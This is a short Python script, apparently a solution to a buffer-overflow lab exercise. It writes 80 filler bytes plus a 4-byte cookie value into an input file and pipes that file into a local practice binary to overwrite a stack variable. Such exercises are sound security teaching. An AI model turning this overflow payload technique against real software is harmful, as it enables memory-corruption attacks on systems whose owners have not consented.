#!/usr/bin/python3
import sys
import subprocess

file = '/home/kribas/Software-Security-Lab/bof-exercise-2/bof1/input.txt'
buff_len = 80
cookie = b'\x05\x03\x02\x01'
buffer = b'A'*buff_len + cookie

with open(file,'wb') as f:
	f.write(buffer)
	f.close()
with open(file,'rb') as f:
	prog = subprocess.run(['/home/kribas/Software-Security-Lab/bof-exercise-2/bof1/bof1'],stdin=f,capture_output=True)
	sys.stdout.buffer.write(prog.stdout)
	f.close()

